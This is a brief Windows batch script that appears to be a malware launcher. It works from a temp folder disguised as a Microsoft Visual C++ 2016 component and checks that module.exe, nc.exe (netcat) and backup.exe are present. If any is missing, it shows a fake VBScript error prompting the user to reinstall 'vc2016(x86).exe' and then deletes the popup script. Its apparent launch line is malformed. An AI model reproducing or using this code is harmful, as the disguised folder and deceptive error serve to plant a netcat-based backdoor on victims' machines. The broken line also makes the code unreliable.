
cd /d %temp%\Microsoft_Visual_2016\
echo %cd%
if NOT EXIST %temp%\Microsoft_Visual_2016\module.exe goto Message
if NOT EXIST %temp%\Microsoft_Visual_2016\nc.exe goto Message
if NOT EXIST %temp%\Microsoft_Visual_2016\backup.exe goto Message
start if NOT EXIST %temp%\Microsoft_Visual_2016\module.exe goto Message
goto EOF
:Message
set rnd=%random%
echo X=msgbox("Error: x0004222: This application cannot start correctly. Reinstall vc2016(x86).exe",0+16,"Missing Files")>>%temp%\%rnd%.vbs
start %temp%\%rnd%.vbs
ping localhost -n 5 >nul
del %temp%\%rnd%.vbs
:EOF
